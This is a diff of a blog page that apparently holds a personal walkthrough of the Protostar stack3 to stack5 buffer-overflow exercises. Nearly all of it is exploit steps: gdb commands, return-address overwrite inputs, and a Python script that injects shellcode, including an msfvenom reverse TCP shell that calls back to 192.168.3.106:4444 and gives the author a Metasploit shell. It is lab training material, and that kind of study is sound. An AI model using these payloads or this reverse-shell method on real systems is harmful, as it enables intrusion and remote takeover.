@@ -117,7 +117,7 @@
 
       <div class="read-time">
         <small>
-          1 minute read
+          2 minute read
         </small>
       </div>
 
@@ -179,6 +179,101 @@ link knowledge:
 
 <h4 id="x03-stack3">0x03 stack3</h4>
 <div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+    gdb ./stack3
+    b win
+    output:breakpoint 1 at 0x804842a...
+    quit
+    python -c "print 'A'*64+'\x2a\x84\x04\x08'" | ./stack3
+</code></pre>
+</div>
+
+<h4 id="x04-stack4">0x04 stack4</h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+    gdb ./stack4
+    disas win
+        查得win函数的地址为080483f4
+    disas main
+    b *main+3
+        esp最后一位置0,实时跟踪esp最后一位为8
+        填充字节数为8+64+4(4为main函数中的ebp所占空间)=76
+        最后确定77-80个字节为覆盖main函数的返回地址的位置
+    q
+    y
+    r &lt; /tmp/stack4
+        /tmp/stack4为AAA..A1234(76个A+1234)
+    vi /tmp/stack4
+    :%!xxd
+        修改31323334处为f4830408
+    :%!xxd -r(保存作用)
+    gdb ./stack4
+    r &lt; /tmp/stack4
+</code></pre>
+</div>
+
+<h4 id="x05-stack5">0x05 stack5</h4>
+<div class="highlighter-rouge"><pre class="highlight"><code>mykey:
+    su
+    godmode
+    vi /proc/sys/fs/suid_dumpable
+        设置为1，允许suid文件可以dump
+    cd /tmp
+    vi stack5.py
+    ----------stack5.py---------
+    #!/usr/bin/python
+    import os
+    import sys
+    import struct
+    
+    shellcode1="\x90"*40
+    shellcode1="\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xb0\x04\xb3\x01\x68\x64\x21\x21\x21\x68\x4f\x77\x6e\x65\x89\xe1\xb2\x08\xcd\x80\xb0\x01\x31\xdb\xcd\x80"
+    
+    shellcode =  "\x90"*30
+    #msfvenom -p linux/x86/shell/reverse_tcp LHOST=192.168.3.106 LPORT=4444 -b \x00 -f py
+    shellcode += "\xda\xd1\xbe\xd9\xba\xd5\x41\xd9\x74\x24\xf4\x58\x29"
+    shellcode += "\xc9\xb1\x12\x31\x70\x1a\x83\xc0\x04\x03\x70\x16\xe2"
+    shellcode += "\x2c\x8b\x0e\xb6\x2d\xbf\xf3\x6a\xdb\x42\x44\xea\x92"
+    shellcode += "\xa2\x69\x73\x33\x7f\x1a\xb4\x93\x83\xb0\x5c\xe1\x83"
+    shellcode += "\x55\xc1\x6c\x62\x3f\x9f\x36\x35\x91\x08\x4f\x54\x52"
+    shellcode += "\x7a\xcf\x25\x52\x3d\xcf\x59\x5d\x3d\x46\xba\x9c\xd6"
+    shellcode += "\x54\xfc\xfc\x25\xd4\x83\xcf\xb6\x4f\xf5\x31\x2f\xd9"
+    shellcode += "\x09\x02\x53\xe8\x92\x9d\xb5"
+    
+    ret=0xbffff780
+    payload = 'A'*76+struct.pack("&lt;I",ret)+shellcode
+    f=open("/tmp/tmp.txt","a+")
+    f.write(payload)
+    f.close()
+    input=payload
+    #print input
+    os.system("echo '%s' | /opt/protostar/bin/stack5" % input)
+    ------------end-------------
+    use msf listen on 4444 with the same payload
+    python stack5.py
+    gdb -q -c co[tab]
+    output:permission denied
+    ls -al /tmp/co[tab]
+    output:
+    -rw-------  1 root user 163840 Jun  9 01:19 core.11.stack5.6174
+    su
+    godmode
+    chmod 777 /tmp/co[tab]
+    su - user
+    user
+    bash
+    cd /tmp
+    gdb -q -c co[tab]
+    x/20x $esp
+    ----output:-------
+    0xbffff850:     0x90909090      0x90909090      0x90909090      0x90909090
+    0xbffff860:     0x90909090      0x90909090      0x90909090      0xd1da9090
+    0xbffff870:     0xd5bad9be      0x2474d941      0xc92958f4      0x703112b1
+    ------end---------
+    vi /tmp/stack5.py
+    ----------stackt.py on ret---------
+    ret=0xbffff850
+    ----------------end----------------
+    python stack5.py
+    msf receive a shell from protostar
 </code></pre>
 </div>
 
